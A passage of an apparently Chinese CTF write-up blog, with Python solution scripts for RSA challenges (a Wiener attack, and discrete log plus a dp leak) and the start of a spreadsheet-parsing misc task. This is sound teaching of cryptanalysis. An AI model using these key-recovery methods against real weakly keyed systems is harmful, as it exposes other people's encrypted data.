class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod</span><br><span class="line"><span class="keyword">import</span> RSAwienerHacker</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi_b</span>(<span class="params">x</span>):</span><br><span class="line">    bt = <span class="number">536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273</span></span><br><span class="line">    <span class="keyword">return</span> invmod(x, bt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0x8be72dc460daa1969461cd9a4b7e4505dfaac743ae5dd18ee5e9c8acfc3576cd59c56b55236d53bdce4118d07949d88c1e80b318cc3dac7195f747fade1de196a29e057f95aec5a01792af0458babb96cfda9ebf1832312d78f3757daab9583feec6a30e858f6b4f9c5f3bd314bb2e4ff87887020b06d5158a95d4328fb74e1976d914dd83b90cc9bf11fa7206c40d3b73d9f423e59d771fa67cb5317c354070360d9b4d1b967ce09861b3c2ae31b8f9a21aebbb57bed0b0c5381b2a9870f079618f5bbd1c0fe2cb8e2225d2b1bf0780f732e87f9c4a92a56d79ff801375d0487e350d913123bad8c7da12dc8ce2531f5a808d47a25a89d7b91e61875aa70a1d40b118820ed62c055154896d6e39eccb9d2ceba43ce60d283e6f52f65611e2c80b0d0c8c63caf91c9c7806e2f068808c647d082d5b15266e8938c50ebc9e92874c1878b426bb1d61b02c77d885840422dfc9a02df06797b6bc7a175b3c642ef6c688772780cb5099ceb55cdcd64ddca46d39dd827169e0a907c7ff57626b5f20bad2c91069210afaac9d02708d1a41e706bffe0d9a0874d5a154684615cf3496e3878d8c208a3d56a7cc343b27247095b6369fcb715d6b45d444c6ab2aa6a389c3a1b75f496c7eb3b2c16923b797928ffe2c2b4132dda95475b4609062f58c4091fcab62d19cd3d5da6829818b05828501f535391ed1c4efeb88d4a898405f0d</span></span><br><span class="line">e = <span class="number">0x5f8242974c02d4fec6bb856593794a3c6572493ea1e7f146cae3152279e2ebcb396fb854c28ef0f406490b716d7d7deb1fdd505c0b41f060105f5ebf4e2e320f73f23e7162538278955e692599a19a5361306d7c8d9fa30324c3a0ec3781fc49e2e8015a6ce64bd77fb4daa235ce11f9c5251b7e0c3b366006463cbf3f0543c8211bcd28cf582e75bcbf6457c2d6e1870487a3342009c17bec106c0d610f406473d300e0287116703ce1606e958f909c4bd392bb5157c975f41d4b9eb07b5e856d97ba9b1f706826b4f4a3e6a0f8cfc96802bc0ead5f557eca08f5a99b5ce6fea605e58629e78ed0abbdfd1bd4994b6fc0144bc259b0595c05fa07933be4108bc62ba56f05063c77c55f9a140c251a85f39883befc68cb0ed828a1b65cc0c86ecc85592ef705861e20a8251f8d024ef7a19eb8a1c8206d2f6270c58130845e13db34a61142812b92baa1ca0372c0c7450801863dcc58515289cee483ba8b0bcdb4034c57512570b25f9e72d59cf764df9d53c6b88af95455ff550df7134395bb7b447b15fa00ada6f36fa466350833b102ab204c9c768477b23cb568927e82832152dc84a9416e595136a9145bb78e7b4913d8003db53dd30b7b80280a62faeeb7989e525c75a2aefc7cd55a0fe328ed952e6b70902d2aa28e4f2f13304f3aa38ebd9583a9014c7273f1d45612bb3fd55f4b35ced7fadbb95c32af8aaa79eaaf</span></span><br><span class="line">c = <span class="number">0x74a91da3e1fec9d7f2b90d470d44459122ac090eb9705087bbc61ec7d1a9a7ffbe9b181c2439b15f349813632efe977f35892ecdfa3db5dec58ce412c997192975ca3037a5bc7257e1c6662320cebe793f8c40919d9793112d729810045474278a0d44d876aa56693692310be5804581f3465e26ddec70b6afe28176f20129f90dd8c6283e90d2af7845e5b325563bc67998f62dc0fa5be56ca1f59bd99f7e9cf006f15b3c7b1b7d1741282bbe034eb0ffe9416df74c4b1f18cc279d2dfcddd20e2fda7397f72bbc8b9aa377bbbe2b386b8e8dd4bcc2a59cd737c41bcd15f111f805a16483b200f78384949af092cf1495452184d21a8f98bb9192ae17799ef806c79732043522bb5b830855ac20cfd4ac2cd8da2306a9d43b5e50dedb36b17212e3fce2458d6fc079a7bc32289fa7113e10569a86fde0354978a0a581c0aa388386224b6937d632ecaa9f42f9fc601512561950464cc26f568fa80c3d4037280ca6760d01a56396fe5fa2cd2bc9095a4cafb218bffdcbd5c845e6ebbd86342dad0d9cf1d0abc2552898b9e0c6cced24dec559d896107607417abb1f1d96c7de6e766d4e5d0651f75412cdccb7ef49dfc5edc3e32f0e6a1bb5cfd7110285605d44df903870ed4137beb6297610c5e64a78c4d0f052099b948d1cf88dbe58cd5a5dcb9402b146fa6a9d06a4dc085c55b29e362c7d752eabbf1a0236ca6ba98455</span></span><br><span class="line">t = pi_b(e)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"><span class="comment"># 获取u、phin</span></span><br><span class="line">u, phin = RSAwienerHacker.hack_RSA(t, n)</span><br><span class="line"><span class="comment"># 根据维纳攻击求得的phin，求得解密私钥d</span></span><br><span class="line">d = invmod(e, phin)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;bf30ea48-ca79-425e-80d1-00368e9ff48f&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="easy-pow"><a href="#easy-pow" class="headerlink" title="easy_pow"></a>easy_pow</h3><blockquote><p>这题源于《羊城杯2020-Power》这一题，并做了一些改编，但是我们可以根据羊城杯的那一题得到这题的部分思路。</p></blockquote><p>题目的脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> lcm, invert </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p**<span class="number">4</span>*q</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">hint1 = (invert(e, lcm(p - <span class="number">1</span>, q - <span class="number">1</span>))) % (p - <span class="number">1</span>) </span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br><span class="line"></span><br><span class="line">b = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">a = <span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="built_in">pow</span>(<span class="number">2</span>, a, b)</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span></span><br><span class="line"><span class="comment"># hint1 = 5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span></span><br><span class="line"><span class="comment"># hint2 = 70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span></span><br></pre></td></tr></table></figure><p>但是这个hint1给的，我们直接就能求得p了。本来一直求、一直求就是求不出来p的值，原来是c和hint2的值写反了(题目上面给的就是反的)…</p><h4 id="hint2相关"><a href="#hint2相关" class="headerlink" title="hint2相关"></a>hint2相关</h4><p><strong>首先根据hint2通过sympy.discrete_log()函数求得这个指数a</strong></p><p>代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">hint2 = <span class="number">299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span></span><br><span class="line"><span class="comment"># a = discrete_log(b, hint2, 2)</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="comment"># 用时较长，估计4分钟左右</span></span><br><span class="line"><span class="comment"># 19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span></span><br><span class="line">a = <span class="number">19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span></span><br><span class="line"><span class="keyword">assert</span> hint2 == <span class="built_in">pow</span>(<span class="number">2</span>, a, b)</span><br></pre></td></tr></table></figure><p><strong>然后就是有a求p了，这就是一个简单的解方程的过程</strong></p><p>解高次方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = Symbol(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">p = solve(<span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span> - a, p)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment"># 用时1-2秒</span></span><br><span class="line"><span class="keyword">assert</span> a == <span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span></span><br></pre></td></tr></table></figure><p>此时<code>hint2</code>的价值已经被剥削完了，再看<code>hint1</code></p><h4 id="hint1相关"><a href="#hint1相关" class="headerlink" title="hint1相关"></a>hint1相关</h4><p>hint1的代码也很简单，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hint1 = (invert(e, lcm(p - <span class="number">1</span>, q - <span class="number">1</span>))) % (p - <span class="number">1</span>) </span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br></pre></td></tr></table></figure><p>这里注意到这个<code>lcm(p - 1, q - 1)</code>与<code>phin = (p - 1) * (q - 1)</code>的值是非常接近的，后者是前者的倍数，但是这个倍数不大。<code>invert(e, lcm(p - 1, q - 1))</code>可以看做<code>invert(e, phin)</code>也就是d(其实不是，但是他们mod (p-1)之后就相等了，因为<code>invert(e, phin) - invert(e, lcm(p - 1, q - 1))</code>后的值肯定是(p-1)的倍数，那这个hint1也是dp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = m ** e mod n</span><br><span class="line">dp = d mod (p-1)</span><br><span class="line"></span><br><span class="line">c**dp = m**(e*dp) mod n</span><br><span class="line">c**dp mod p = m**(e*dp) mod p</span><br><span class="line">e*dp = e*d mod (p-1) = 1 mod (p-1)</span><br><span class="line">c**dp mod p = m**(1+k*(p-1)) mod p</span><br><span class="line">#由费马小定理得 </span><br><span class="line">m**(p-1)=1 mod p</span><br><span class="line">#所以</span><br><span class="line">c**dp mod p = m*m^(k*(p-1)) mod p = m mod p</span><br><span class="line">#故有</span><br><span class="line">pow(c,dp,p) = m mod p</span><br><span class="line">#当然前提是m本身比p小，以最终flag的长度猜测，实际上是符合该条件的</span><br></pre></td></tr></table></figure><p>故最后一步的代码为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span></span><br><span class="line">hint1 = <span class="number">5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span></span><br><span class="line">c = <span class="number">70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, hint1, <span class="built_in">int</span>(p))))</span><br></pre></td></tr></table></figure><h4 id="整体代码-amp-获得flag"><a href="#整体代码-amp-获得flag" class="headerlink" title="整体代码&amp;获得flag"></a>整体代码&amp;获得flag</h4><p>整合一下上面的各步骤的代码，最终获得flag的脚本为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">b = <span class="number">449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839</span></span><br><span class="line">hint2 = <span class="number">299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274</span></span><br><span class="line"><span class="comment"># a = discrete_log(b, hint2, 2)</span></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"><span class="comment"># 用时较长，估计4分钟左右</span></span><br><span class="line"><span class="comment"># 19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span></span><br><span class="line">a = <span class="number">19039248081261108110237206075268559437678159508015523828645058617675042748198418194907349975507115488747229689793306501953021566998766345933855885943407635103681152619750041248113215451617325356748154730074958830651307787203109710830007696552292671691212108386818316311932651197282559315876797500721498473208824298835418182140730876531464486313083647487044405713663927753597473947163510285604984204523887139665716560635683340324006902758275303874097312310690117144479343885527915248694325000298157331914803230518573529211435134986828982994076033521843390710607353879567891914609477503923586407673676430299224160321995818</span></span><br><span class="line"><span class="keyword">assert</span> hint2 == <span class="built_in">pow</span>(<span class="number">2</span>, a, b)</span><br><span class="line"></span><br><span class="line">p = Symbol(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">p = solve(<span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span> - a, p)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="comment"># 用时1-2秒</span></span><br><span class="line"><span class="keyword">assert</span> a == <span class="number">2021</span>*p**<span class="number">3</span> + <span class="number">2022</span> + <span class="number">2023</span>*p**<span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497</span></span><br><span class="line">hint1 = <span class="number">5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817</span></span><br><span class="line">c = <span class="number">70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, hint1, <span class="built_in">int</span>(p))))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;24uz5n82476b3315k6m8rk333b37pa22&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>所以这里求dp除了<code>(invert(e, (p - 1) * (q - 1))) % (p-1)</code>之外，还有另一种方式，那就是<code>(invert(e, lcm(p - 1, q - 1))) % (p - 1) </code>，求得的也是dp。</p><h2 id="Misc-赛后补打完"><a href="#Misc-赛后补打完" class="headerlink" title="Misc (赛后补打完)"></a>Misc (赛后补打完)</h2><h3 id="Girlfriend’s-account"><a href="#Girlfriend’s-account" class="headerlink" title="Girlfriend’s account"></a>Girlfriend’s account</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jackie的女朋友又偷偷用他的信用卡买东西了，你能算算一共花了多少钱吗？</span><br></pre></td></tr></table></figure><p>这个xlsx文件分析，里面是数据需要转换，直接使用xlrd模块来提取数据再进行处理，其中金额大写转小写是我百度py的脚本，准确度也是很高的，下面是脚本的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">amount</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    摘自: https://blog.csdn.net/farewellnec/article/details/103686077</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    chinese_num = &#123;<span class="string">&#x27;零&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;壹&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;贰&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;叁&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;肆&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;伍&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;陆&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;柒&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;捌&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;玖&#x27;</span>: <span class="number">9</span>&#125;</span><br><span class="line">    chinese_amount = &#123;<span class="string">&#x27;分&#x27;</span>: <span class="number">0.01</span>, <span class="string">&#x27;角&#x27;</span>: <span class="number">0.1</span>, <span class="string">&#x27;元&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;拾&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;佰&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;仟&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;圆&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">    amount_float = <span class="number">0</span></span><br><span class="line">    amount_yuan = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> chinese_amount:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> amount:</span><br><span class="line">            <span class="keyword">if</span> amount[amount.index(i) - <span class="number">1</span>] <span class="keyword">in</span> chinese_num.keys():</span><br><span class="line">                amount_yuan += chinese_num[amount[amount.index(i) - <span class="number">1</span>]] * chinese_amount[i]</span><br><span class="line">    amount_float += amount_yuan</span><br><span class="line">    <span class="keyword">return</span> amount_float</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 